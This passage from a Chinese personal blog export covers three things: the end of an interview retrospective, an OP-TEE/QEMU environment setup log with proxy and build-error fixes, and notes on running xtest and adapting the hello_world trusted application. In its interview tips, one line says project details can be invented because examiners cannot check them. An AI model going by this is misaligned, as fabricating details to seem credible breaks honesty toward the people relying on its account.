呃呃啊啊了一会儿，坐立不安2333</p>\n<p>他说你说的白盒黑盒是一种分类，还有其它分类</p>\n<p>我说噢，集成测试……他打断，集成测试是很后面的了，前面还有</p>\n<p>我就知道问什么了，说先是单元测试、功能测试、集成测试，最后还有性能测试</p>\n<p>只能说没记到烂熟于心的程度，脑子里有，但是一紧张讲不出来……</p></li>\n<li><p><strong>济星云有使用什么协同工具吗</strong></p>\n<p>我说用阿里云云效，有代码仓库，有CICD，有类似飞书的共享文档，有任务看板</p></li>\n<li><p><strong>熟悉什么设计模式？</strong></p>\n<p>我说，就从我用到过的几个讲，把我一时间想到的都说了一遍</p></li>\n<li><p><strong>讲一下单例模式和工厂模式在什么时候使用</strong></p>\n<p>就举了几个例子说明</p></li>\n</ol>\n<p>然后他开始问OJ了，就到了我觉得答的最不好的一个题目</p>\n<ol type=\"1\">\n<li><p><strong>讲一下从提交代码到判题完成的全流程</strong></p>\n<p>我一开始没get到，我以为讲一下OJ的工作过程就可以了。结果他想问的是“从浏览器输入地址到打开网页的全流程”这样的问题，要你讲出所有小细节。</p>\n<p>我都讲到开始评测的时候，他打断我，说直接就能评测吗？编译完直接就能评测吗？</p>\n<p>我蒙了，（不是吗？</p>\n<p>后来听明白了，他就是想我讲操作系统的细节。这就有点慌，没能慢慢思考，讲的有点磕巴</p>\n<p>相关的我好像只提到了进程切换的时候保存上下文，switch（我还口误说成io多路复用的select了），中断，其他我啥都没说出来。</p>\n<p>确实也没复习，有好多知识点分散在我脑子里，我串不起来，我觉得这个题扣大分，接下来就复习操作系统</p>\n<p>现在我复盘有好多可以讲的，从发送请求开始就有套接字，io多路复用这些。</p></li>\n</ol>\n<p>然后时间就已经到了，最后一个老师问我小胶质细胞的项目：</p>\n<ol type=\"1\">\n<li><p><strong>为什么要先分割再检测</strong></p>\n<p>我说因为认为可能分割会提供一些更有用的特征，作为检测的输入可以提供一些更好的依据（类似这个意思）</p>\n<p>他追问，有一个XXXX模型（名字忘了），可以同时分割和检测，有试过吗？</p>\n<p>之前我答辩的时候，问我的是Yolo本身就可以检测和分割，那个问题我准备好了，说实验过，yolo效果不如这样……就行了</p>\n<p>但是这个模型我名字都没听过，不敢多说，就直接说没用过了</p></li>\n<li><p><strong>你提到了使用了Focal Loss，讲解一下Focal\nLoss的形式</strong></p>\n<p>我说损失函数外面套一个 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -1.126ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.864ex\" height=\"3.083ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -864.9 824 1362.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(235.2,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"1D6FE\" d=\"M31 249Q11 249 11 258Q11 275 26 304T66 365T129 418T206 441Q233 441 239 440Q287 429 318 386T371 255Q385 195 385 170Q385 166 386 166L398 193Q418 244 443 300T486 391T508 430Q510 431 524 431H537Q543 425 543 422Q543 418 522 378T463 251T391 71Q385 55 378 6T357 -100Q341 -165 330 -190T303 -216Q286 -216 286 -188Q286 -138 340 32L346 51L347 69Q348 79 348 100Q348 257 291 317Q251 355 196 355Q148 355 108 329T51 260Q49 251 47 251Q45 249 31 249Z\"/></g><rect width=\"584\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 次方</p></li>\n</ol>\n<p>另外问了我：</p>\n<ol type=\"1\">\n<li><p><strong>你自我介绍里提到，想要实现区块链和AI的结合，你觉得有哪些地方可以用上AI</strong></p>\n<p>我说比如现在区块链的排序算法，来控制这个请求应该在哪个节点上执行的调度算法，现在是用的传统的RIFT，也许可以使用AI的一些方式来优化这里的排序</p></li>\n</ol>\n<h1 id=\"总结\">总结</h1>\n<p>面试的时候嘴巴基本没停（有2个地方有磕巴：软件测试方法想不出来、OJ+操作系统底层），但是看第二个软工老师的反应并不是很好，看不出来他的态度。</p>\n<p>问题密度非常大，我忘记看我自我介绍完还剩多少时间，应该大概还剩15分钟，上面一个老师就提了快15个问题，我语速也非常快，拼命讲拼命讲。</p>\n<p>没想到会问这么多软件工程相关的内容……我以为他会侧重项目一些细节，我详细准备的地方他都没有问。自我介绍里有一些一笔带过的技术细节，其实就是希望老师提问的时候再问一点的，也可能是因为老师也没了解这一块内容不能判断我讲的对不对、或者他知道这种问题我肯定会准备的很充分，反而挑着我没准备的内容问。</p>\n<p>以及面试前还会担心老师问一些水问题，比如为什么选择来浙大、为什么想做系统而不是AI等等，完全没问，15分钟提问时间非常扎实，全是干货，好评。</p>\n<p>问题提的确实招招致命，济星云确实就不是一个很优秀的大型项目，更多的是同学们练手的平台。但是既然这个项目老师这么喜欢问，就留下来吧。</p>\n<hr>\n<p>需要再好好准备一下软件工程相关的内容：</p>\n<ul>\n<li>设计模式，直接全背熟</li>\n<li>软件测试</li>\n<li>需求提取</li>\n<li>什么是软件工程</li>\n<li>如何提升团队合作效率</li>\n</ul>\n<p>操作系统：</p>\n<ul>\n<li>进程管理，中断等等，好好复习</li>\n<li>文件管理</li>\n<li>网络编程，套接字这些</li>\n</ul>\n<p>其实面试前重点准备了文件管理（因为写在了简历里）和网络编程（特地复习了IO多路复用），都没用上……</p>\n<p>其实也有机会，我可以在问OJ流程那个题里把网络编程加进去，但是没意识到老师问的是啥</p>\n<p>自我介绍优化一下，不要提算法精英赛了，项目内的优化方式我能讲，项目外的其他AI常见知识真的不了解了。</p>\n<p>然后开始复习，复习完把上面的问题重新回答一遍。预推免的ppt和自我介绍应该都不用重新准备了，基本上可以复用。</p>\n<hr>\n<p>最后总结个准备面试的经验：能准备的内容只有专业知识。</p>\n<p>专业知识是问到了一定得答对，打错了很扣分的。而且专业知识被问到了，如果准备的好就有一连串保证不会错的内容可以输出，很加分且增加自信。</p>\n<p>其他非专业知识的内容，面试前可能准备了好多，但是很小概率能被问到，而且被问到的时候受限于一个上下文的提问环境，可能没办法把准备的答案直接用上，还是得随机应变。所以干脆不准备了。</p>\n<p>项目相关的细节本来其实就是很熟悉的，简单过一遍就可以，相信自己在面试的情况下可以讲得出来，编也可以编出来，具体的细节老师也不知道，只要自圆其说讲的合理就行。</p>\n<h1 id=\"补充\">补充</h1>\n<p>结果通过啦！感谢老师感谢学校</p>\n","categories":["面试"],"tags":["面试","复盘","浙大","保研"]},{"title":"毕设01 - 安装QEMU和OP-TEE环境","url":"/graduation-project/01/","content":"<p>前置任务，安装ubuntu22.04虚拟机，以及必要的环境。</p>\n<p>官方文档提供了教程：https://optee.readthedocs.io/en/latest/building/devices/qemu.html#qemu-v8</p>\n<span id=\"more\"></span>\n<p><strong>注意不要有中文路径！！</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">mkdir</span> optee</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> optee</span><br><span class=\"line\">$ repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml</span><br><span class=\"line\">$ repo <span class=\"built_in\">sync</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> build</span><br><span class=\"line\">$ make toolchains</span><br><span class=\"line\">$ make run </span><br></pre></td></tr></table></figure>\n<p>但是 <code>repo</code> 会连接不上服务器，改成清华源。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml --repo-url=https://mirrors.tuna.tsinghua.edu.cn/git/git-repo</span><br></pre></td></tr></table></figure>\n<p>下载速度太慢，在 <code>~/.bashrc</code> 配置一下代理</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> http_proxy=192.168.3.56:10809</span><br><span class=\"line\"><span class=\"built_in\">export</span> https_proxy=192.168.3.56:10809</span><br><span class=\"line\"><span class=\"built_in\">export</span> ftp_proxy=192.168.3.56:10808</span><br><span class=\"line\"><span class=\"built_in\">export</span> socks_proxy=192.168.3.56:10808</span><br><span class=\"line\"><span class=\"built_in\">export</span> no_proxy=<span class=\"string\">\"localhost,127.0.0.1\"</span></span><br></pre></td></tr></table></figure>\n<p>发现 ping 不通谷歌，是因为 ping 走的是 ICMP 协议，不走代理。用 curl\n来检查。</p>\n<p>如果发现 <code>apt</code> 用不了了，输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> -n ftp_proxy </span><br><span class=\"line\"><span class=\"built_in\">export</span> -n http_proxy</span><br><span class=\"line\"><span class=\"built_in\">export</span> -n https_proxy </span><br><span class=\"line\"><span class=\"built_in\">export</span> -n socks_proxy</span><br></pre></td></tr></table></figure>\n<p>git 配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://192.168.3.56:21882</span><br></pre></td></tr></table></figure>\n<p>docker 配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">touch /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Service]</span><br><span class=\"line\">Environment=\"HTTP_PROXY=http://192.168.3.56:21882\"</span><br><span class=\"line\">Environment=\"HTTPS_PROXY=http://192.168.3.56:21882\"</span><br><span class=\"line\">Environment=\"NO_PROXY=localhost,127.0.0.1,.example.com\"</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>中间遇到报错，看缺什么包就安什么包。</p>\n<p>记录几个不好解决的：</p>\n<p>提示需要设置参数 <code>FORCE_UNSAFE_CONFIGURE=1</code></p>\n<p>修改指令为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">make run FORCE_UNSAFE_CONFIGURE=1</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">configure: error: winscard.h is required for pcsc</span><br></pre></td></tr></table></figure>\n<p>需要先安装必要的包，然后手动设置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> C_INCLUDE_PATH=/usr/include/PCSC:<span class=\"variable\">$C_INCLUDE_PATH</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  File \"/home/cishoon/桌面/optee/out-br/build/host-python3-3.11.8/./setup.py\", line 1450, in detect_ctypes</span><br><span class=\"line\">    print('Header file {} does not exist'.format(ffi_h))</span><br><span class=\"line\">UnicodeEncodeError: 'utf-8' codec can't encode character '\\udce6' in position 27: surrogates not allowed</span><br></pre></td></tr></table></figure>\n<p>是因为ubuntu系统是中文的，我的路径放在桌面上，桌面是中文文件夹。不能在有中文文件夹路径里安装。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*** WARNING: renaming \"_ctypes\" since importing it failed: /home/cishoon/桌面/optee/out-br/build/host-python3-3.11.8/build/lib.linux-x86_64-3.11/_ctypes.cpython-311-x86_64-linux-gnu.so: undefined symbol: ffilibffi_type_void</span><br><span class=\"line\"></span><br><span class=\"line\">The necessary bits to build these optional modules were not found:</span><br><span class=\"line\">_bz2                 _curses              _curses_panel     </span><br><span class=\"line\">_dbm                 _gdbm                _lzma             </span><br><span class=\"line\">_tkinter             nis                  readline          </span><br><span class=\"line\">Compiling '/home/cishoon/桌面/optee/out-br/per-package/host-python3/host/lib/python3.11/warnings.py'...</span><br><span class=\"line\">Compiling '/home/cishoon/桌面/optee/out-br/per-package/host-python3/host/lib/python3.11/wave.py'...</span><br><span class=\"line\">To find the necessary bits, look in setup.py in detect_modules() for the module's name.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">The following modules found by detect_modules() in setup.py have not</span><br><span class=\"line\">been built, they are *disabled* by configure:</span><br><span class=\"line\">_ctypes_test         _sqlite3             _testbuffer       </span><br><span class=\"line\">_testcapi            _testclinic          _testimportmultiple</span><br><span class=\"line\">_testinternalcapi    _testmultiphase      _xxtestfuzz       </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Following modules built successfully but were removed because they could not be imported:</span><br><span class=\"line\">_ctypes           </span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">File \"/home/cishoon/桌面/optee/out-br/per-package/host-python-setuptools/host/lib/python3.11/site-packages/wheel/bdist_wheel.py\", line 28, in &lt;module&gt;</span><br><span class=\"line\">    from .macosx_libfile import calculate_macosx_platform_tag</span><br><span class=\"line\">  File \"/home/cishoon/桌面/optee/out-br/per-package/host-python-setuptools/host/lib/python3.11/site-packages/wheel/macosx_libfile.py\", line 43, in &lt;module&gt;</span><br><span class=\"line\">    import ctypes</span><br><span class=\"line\">  File \"/home/cishoon/桌面/optee/out-br/per-package/host-python-setuptools/host/lib/python3.11/ctypes/__init__.py\", line 8, in &lt;module&gt;</span><br><span class=\"line\">    from _ctypes import Union, Structure, Array</span><br><span class=\"line\">ModuleNotFoundError: No module named '_ctypes'</span><br></pre></td></tr></table></figure>\n<p>没有 <code>_ctypes</code> 包，原因是编译 <code>python</code>\n时没有找到 <code>libffi</code>，但是已经安装了 <code>libffi</code></p>\n<p>是因为路径没有指定正确。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@cishoon-virtual-machine:out-br]# find /usr -name ffi.h</span><br><span class=\"line\">/usr/include/x86_64-linux-gnu/ffi.h</span><br><span class=\"line\">[root@cishoon-virtual-machine:out-br]# find /usr -name libffi.so</span><br><span class=\"line\">/usr/lib/x86_64-linux-gnu/libffi.so</span><br></pre></td></tr></table></figure>\n<p>安装结束后报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">* QEMU is now waiting to start the execution</span><br><span class=\"line\">* Start execution with either a 'c' followed by &lt;enter&gt; in the QEMU console or</span><br><span class=\"line\">* attach a debugger and continue from there.</span><br><span class=\"line\">*</span><br><span class=\"line\">* To run OP-TEE tests, use the xtest command in the 'Normal World' terminal</span><br><span class=\"line\">* Enter 'xtest -h' for help.</span><br><span class=\"line\"></span><br><span class=\"line\"># 选项“-x”已弃用并可能在 gnome-terminal 的后续版本中移除。</span><br><span class=\"line\"># 选项“-x”已弃用并可能在 gnome-terminal 的后续版本中移除。</span><br><span class=\"line\"># 使用“-- ”以结束选项并将要执行的命令行追加至其后。</span><br><span class=\"line\"># 使用“-- ”以结束选项并将要执行的命令行追加至其后。</span><br><span class=\"line\"># 无法处理参数：无法打开显示：</span><br><span class=\"line\"># 无法处理参数：无法打开显示：</span><br></pre></td></tr></table></figure>\n<p>https://blog.csdn.net/Frinklin_wang/article/details/135404352</p>\n<p>直接在虚拟机里执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dbus-launch gnome-terminal</span><br></pre></td></tr></table></figure>\n<p>会创建一个新的终端窗口。</p>\n<p>然后再在新窗口里执行 make run，完成后就会进入 QEMU 并自动打开secure\nworld和normal world</p>\n<figure>\n<img src=\"/graduation-project/01/image-20240928011246367.png\" alt=\"image-20240928011246367\">\n<figcaption aria-hidden=\"true\">image-20240928011246367</figcaption>\n</figure>\n<p>明天先了解一下 dbus-launch gnome-terminal\n这些指令是啥意思，然后看看能不能ssh远程连接使用。</p>\n<p>具体启动optee的流程看下一篇博客。</p>\n","categories":["笔记"],"tags":["TrustZone","毕设","op-tee","QEMU"]},{"title":"毕设02 - OP-TEE，Hello World","url":"/graduation-project/02/","content":"<p>昨天配了一天环境，今天先解决昨天遗留的问题：</p>\n<ul>\n<li>dbus-launch gnome-terminal 是什么指令？</li>\n<li>optee 怎么启动？</li>\n</ul>\n<span id=\"more\"></span>\n<h1 id=\"dbus-launch-gnome-terminal\">1 dbus-launch gnome-terminal</h1>\n<ol type=\"1\">\n<li><p><code>dbus-launch</code>: <code>dbus-launch</code> 是一个用于启动\nD-Bus 会话总线的命令。D-Bus 是 Linux\n系统中进程间通信（IPC）的系统，它允许不同的应用程序彼此之间进行通信。使用\n<code>dbus-launch</code> 可以确保应用程序运行在一个有 D-Bus\n支持的环境中，特别是在图形用户界面中。如果你的桌面会话中 D-Bus\n没有正确启动，某些需要 D-Bus 通信的程序可能无法正常工作。</p></li>\n<li><p><code>gnome-terminal</code>: 这是启动 GNOME 终端的命令，GNOME\n终端是 Linux 上 GNOME 桌面环境中的默认终端模拟器。</p></li>\n</ol>\n<p>结合起来，<code>dbus-launch gnome-terminal</code> 的作用是： -\n启动一个带有 D-Bus 会话总线支持的 GNOME 终端。换句话说，它确保 GNOME\n终端启动时可以正常使用 D-Bus 的功能。</p>\n<p>通常情况下，D-Bus 会在桌面环境启动时自动启动，因此用户不需要手动运行\n<code>dbus-launch</code>。但在某些特殊情况下，例如在没有图形会话或远程会话中，<code>dbus-launch</code>\n可以用来手动启动一个 D-Bus 实例以支持某些应用程序的运行。</p>\n<h1 id=\"启动optee\">2 启动optee</h1>\n<p>注意，optee同时只能启动一次，可能是因为会监听相同的端口。</p>\n<h2 id=\"直接在虚拟机中操作\">2.1 直接在虚拟机中操作</h2>\n<ol type=\"1\">\n<li>打开控制台，输入\n<code>dbus-launch gnome-terminal</code>，会打开一个新的控制台</li>\n<li>在新的控制台里，进入 <code>/root/optee/build</code> （你的\n<code>optee</code> 安装路径），执行 <code>make run-only</code>\n<code>make run</code> 会执行所有编译和检查，比较慢；安装成功后直接执行\n<code>make run-only</code> 更快。</li>\n</ol>\n<h2 id=\"通过ssh连接远程操作\">2.2 通过ssh连接远程操作</h2>\n<p>我使用的是mac。</p>\n<h3 id=\"方法一xquartz\">方法一：XQuartz</h3>\n<ol type=\"1\">\n<li><p>安装 XQuartz，在官网下载最新版直接安装。</p></li>\n<li><p>启动 XQuartz，在偏好里设置”允许从网络客户端连接“</p>\n<p><img src=\"/graduation-project/02/image-20240928105303669.png\" alt=\"image-20240928105303669\" style=\"zoom:50%;\"></p></li>\n<li><p>在终端输入 <code>dbus-launch gnome-terminal</code>，会在 XQuartz\n里打开一个控制台：</p>\n<p><img src=\"/graduation-project/02/image-20240928110041269.png\" alt=\"image-20240928110041269\" style=\"zoom: 33%;\"></p>\n<blockquote>\n<p>使用 <code>dbus-launch</code>\n还可以启动很多东西，甚至是浏览器，<del>虽然会很卡</del>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> XAUTHORITY=<span class=\"variable\">$HOME</span>/.Xauthority <span class=\"comment\"># 如果报错设置这个环境变量</span></span><br><span class=\"line\">dbus-launch firefox</span><br></pre></td></tr></table></figure>\n<figure>\n<img src=\"/graduation-project/02/image-20240928110909695.png\" alt=\"image-20240928110909695\">\n<figcaption aria-hidden=\"true\">image-20240928110909695</figcaption>\n</figure>\n</blockquote></li>\n<li><p>在这个控制台里，进入 <code>/root/optee/build</code> （你的\n<code>optee</code> 安装路径），执行 <code>make run-only</code></p>\n<p><img src=\"/graduation-project/02/image-20240928113548477.png\" alt=\"image-20240928113548477\" style=\"zoom: 33%;\"></p></li>\n<li><p>(第三步好像可以)</p></li>\n</ol>\n<h3 id=\"方法二tmux推荐\">方法二：tmux（推荐）</h3>\n<ol type=\"1\">\n<li><p>安装 <code>tmux</code></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install tmux</span><br></pre></td></tr></table></figure></p></li>\n<li><p>启动 <code>tmux</code></p></li>\n<li><p>进入 <code>/root/optee/build</code> （你的 <code>optee</code>\n安装路径），执行 <code>make run-only</code></p>\n<p><img src=\"/graduation-project/02/image-20240928114747520.png\" alt=\"image-20240928114747520\" style=\"zoom: 33%;\"></p></li>\n<li><p>使用 <code>tmux</code>\n的命令切换窗口，查看安全世界和普通世界。例如\n<code>ctrl + b, w</code></p>\n<p><img src=\"/graduation-project/02/image-20240928114851423.png\" alt=\"image-20240928114851423\" style=\"zoom:33%;\"></p></li>\n</ol>\n<blockquote>\n<p>Tmux 使用教程：https://www.ruanyifeng.com/blog/2019/10/tmux.html</p>\n</blockquote>\n<p>方法二不需要传输图形界面，会流畅很多，而且最通用。</p>\n<h1 id=\"运行测试\">3 运行测试</h1>\n<p>在 QEMU Monitor 界面输入 <code>'c'</code>\n并按下回车来继续执行虚拟机。</p>\n<p>此时进入 Normal World 终端，会发现虚拟机已经开始执行：</p>\n<figure>\n<img src=\"/graduation-project/02/image-20240928151826867.png\" alt=\"image-20240928151826867\">\n<figcaption aria-hidden=\"true\">image-20240928151826867</figcaption>\n</figure>\n<h2 id=\"buildroot\">3.1 Buildroot</h2>\n<p>系统输出这段话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Welcome to Buildroot,type root or test to login</span><br><span class=\"line\">buildroot login:</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p><strong>什么是 Buildroot？</strong></p>\n<p>*Buildroot** 是一个构建嵌入式 Linux\n系统的工具，用于生成小型且高度定制化的 Linux\n操作系统。它通常被用于嵌入式设备，如路由器、IoT 设备等。</p>\n<p>在 OP-TEE 的虚拟机环境中，Buildroot 被用来创建 Normal World 的 Linux\n环境。这个环境足够轻量级，用于执行测试、运行基本应用，并和 OP-TEE 的\nSecure World 交互。</p></li>\n<li><p><strong><code>root</code> 和 <code>test</code>\n的区别</strong></p>\n<p>在登录提示下，系统提供了两个账户选项：</p>\n<ul>\n<li><p><strong>root</strong>：这是系统的超级用户（管理员）。使用\n<code>root</code>\n登录后，你拥有对系统的完全控制权限，可以执行所有操作，包括安装软件、修改系统配置、启动或关闭服务等。一般来说，默认的登录密码可能为空，或者会在相关的文档中提到。</p></li>\n<li><p><strong>test</strong>：这是一个普通用户账户，用于测试目的。使用\n<code>test</code>\n登录后，你可能只能执行一些受限的操作，比如运行特定的应用程序或脚本，但没有修改系统配置或执行管理员任务的权限。</p></li>\n</ul></li>\n</ul>\n<h2 id=\"xtest\">3.2 xtest</h2>\n<p><code>xtest</code> 是 OP-TEE 提供的一个测试工具，用于验证 OP-TEE\n系统和其功能是否正确工作。它是 OP-TEE 项目的一部分，能够在 OP-TEE Secure\nWorld 和 Normal World 之间执行一系列的集成测试。这些测试涵盖了许多\nOP-TEE\n的核心功能，包括加密操作、密钥管理、身份认证、文件系统操作、以及与普通世界的交互。</p>\n<p>以 root 身份登录，运行 <code>xtest</code>。</p>\n<p>没有任何报错。</p>\n<h2 id=\"运行hello-world\">3.3 运行hello world</h2>\n<p>直接运行 <code>optee_example_hello_world</code> 。这个程序在\n<code>make run</code> 的时候就写入操作系统了。</p>\n<p>编译得到的 CA 在 <code>/usr/bin</code> ，TA 在\n<code>/lib/optee_armtz</code> 中。</p>\n<h1 id=\"ta文件结构\">4 TA文件结构</h1>\n<blockquote>\n<p>参考博客：https://kickstartembedded.com/2022/11/13/op-tee-part-4-writing-your-first-trusted-application</p>\n</blockquote>\n<p><code>optee_example</code> 中提供了一个 <code>hello_world</code>\n文件夹 ，结构如下：</p>\n<p><img src=\"/graduation-project/02/image-20240930212609062.png\" alt=\"image-20240930212609062\" style=\"zoom:50%;\"></p>\n<p>可以被清晰的分为三个部分：</p>\n<ol type=\"1\">\n<li>主机部分：<code>host/</code> 文件夹</li>\n<li>可信部分：<code>ta/</code> 文件夹</li>\n<li>高层构建 Helper</li>\n</ol>\n<h2 id=\"主机部分\">3.1 主机部分</h2>\n<p>主机部分是运行在 <strong>Normal World</strong>\n中的代码。构建过程的一个输出是 <code>libteec.so</code>\n文件，它必须与主机部分链接。主机部分的整体流程大致如下所示。</p>\n<p><img src=\"/graduation-project/02/image-20240930213254910.png\" alt=\"image-20240930213254910\" style=\"zoom:50%;\"></p>\n<h2 id=\"可信部分\">3.2 可信部分</h2>\n<p>可信部分是在 <strong>Secure World</strong>\n中运行的代码。可信部分的总体结构如下所示。注意，各种函数实际上是主机部分启动的事件的回调函数，例如上下文初始化和结束，会话打开和关闭等。</p>\n<p><img src=\"/graduation-project/02/image-20240930213634738.png\" alt=\"image-20240930213634738\" style=\"zoom:50%;\"></p>\n<p>注意到主机部分的函数前缀是 <code>TEEC_</code>，可信部分前缀是\n<code>TA_</code>。</p>\n<h2 id=\"高层构建助手\">3.3 高层构建助手</h2>\n<p>构建助手是 <code>Makefiles</code> 和与 <code>cmake</code>\n相关的文件，它们将帮助我们正确构建 TA。</p>\n<p>Linaro提供的示例最好的特性之一是，用户可以简单地将自己的示例应用程序添加到这个repo中，如果文件夹结构保持正确，您的应用程序将被构建为默认示例!</p>\n<p>一定要探索构建助手文件，亲自查看实现!</p>\n<h1 id=\"修改hello-world\">5 修改Hello World</h1>\n<p>我们将基于 Linaro 提供的 <code>hello_world</code>\n应用程序编写一个修改版本。更重要的是，我们将使其完全与提供的示例分离，而不是直接修改源代码。这将帮助我们更好地理解哪些组件是重要的。</p>\n<h2 id=\"主机部分修改\">5.1 主机部分修改</h2>\n<ol type=\"1\">\n<li><strong>修改 <code>host/Makefile</code> 文件</strong>：\n<ul>\n<li>修改 <code>Makefile</code> 文件中的 <code>BINARY</code>\n变量的值。将其命名为 <code>optee_example_ke_hello_world</code> 。</li>\n</ul></li>\n<li><strong>修改 <code>host/main.c</code> 和\n<code>ta/include/ke_hello_world_ta.h</code> 文件</strong>：\n<ul>\n<li>将名为 <code>hello_world_ta.h</code> 的包含文件名更改为\n<code>ke_hello_world_ta.h</code> 。这意味着你需要在代码中找到所有引用\n<code>hello_world_ta.h</code> 的地方，并将其更改为\n<code>ke_hello_world_ta.h</code> 。</li>\n<li>将 <code>UUID</code> 变量的值更改为\n<code>TA_KE_HELLO_WORLD_UUID</code> 。这意味着你需要在\n<code>ta/include/ke_hello_world_ta.h</code> 中定义一个新的宏\n<code>TA_KE_HELLO_WORLD_UUID</code>\n，这个宏将代表新应用的唯一标识符。</li>\n<li>在 <code>TEEC_InvokeCommand(...)</code> 函数调用中，将命令值更改为\n<code>TA_KE_HELLO_WORLD_INC_VALUE</code> 。</li>\n</ul></li>\n</ol>\n<h2 id=\"可信部分修改\">5.2 可信部分修改</h2>\n<ol type=\"1\">\n<li><strong>ta/Android.mk</strong> - 将 <code>local_module</code>\n变量的值替换为从可信网站生成的新版本4 UUID。</li>\n<li><strong>ta/user_ta_header_defines.h</strong> - 将包含的文件更改为\n<code>ke_hello_world_ta.h</code>。</li>\n<li><strong>ta/user_ta_header_defines.h</strong> - 将名为\n<code>TA_UUID</code> 的宏的值更改为\n<code>TA_KE_HELLO_WORLD_UUID</code>。</li>\n<li><strong>ta/user_ta_header_defines.h</strong> - 在\n<code>TA_CURRENT_TA_EXT_PROPERTIES</code> 宏中，将\n<code>hello_world</code> 的所有出现更改为\n<code>ke_hello_world</code>。</li>\n<li><strong>ta/sub.mk</strong> - 将 <code>srcs-y</code>\n变量中的文件替换为 <code>ke_hello_world_ta.c</code>。</li>\n<li><strong>ta/Makefile</strong> - 将我们在 <code>ta/Android.mk</code>\n中粘贴的版本4 UUID粘贴到 <code>BINARY</code> 变量的值中。</li>\n<li><strong>ta/ke_hello_world_ta.c</strong> - 将\n<code>hello_world_ta.c</code> 重命名为\n<code>ke_hello_world_ta.c</code>，并在其中将包含的文件名称更改为\n<code>ke_hello_world_ta.h</code>。</li>\n<li><strong>ta/ke_hello_world_ta.c</strong> - 在名为\n<code>TA_InvokeCommandEntryPoint(...)</code>\n的函数中，更改开关案例以反映带有 <code>KE_HELLO_WORLD_*</code> 而不是\n<code>HELLO_WORLD_*</code> 的宏。</li>\n<li><strong>ta/include/ke_hello_world_ta.h</strong> - 将\n<code>hello_world_ta.h</code> 重命名为\n<code>ke_hello_world_ta.h</code>，并在其中将定义的宏更改为\n<code>TA_KE_HELLO_WORLD_UUID</code>。同时，将此宏的值更改为我们上面使用的版本4\nUUID。</li>\n<li><strong>ta/include/ke_hello_world_ta.h</strong> -\n将函数ID宏的值更改为使用 <code>KE_HELLO_WORLD_*</code> 而不是\n<code>HELLO_WORLD_*</code>。</li>\n</ol>\n<h2 id=\"高层构建助手修改\">5.3 高层构建助手修改</h2>\n<ul>\n<li><strong>CMakeLists.txt</strong> -\n需要将CMake项目的名称更改为<code>optee_example_ke_hello_world</code>。</li>\n<li><strong>Android.mk</strong> -\n需要将<code>LOCAL_MODULE</code>变量的值更改为<code>optee_example_ke_hello_world</code>。</li>\n</ul>\n<h2 id=\"修改总结\">5.4 修改总结</h2>\n<ul>\n<li>生成UUID（直接使用 Linux 命令 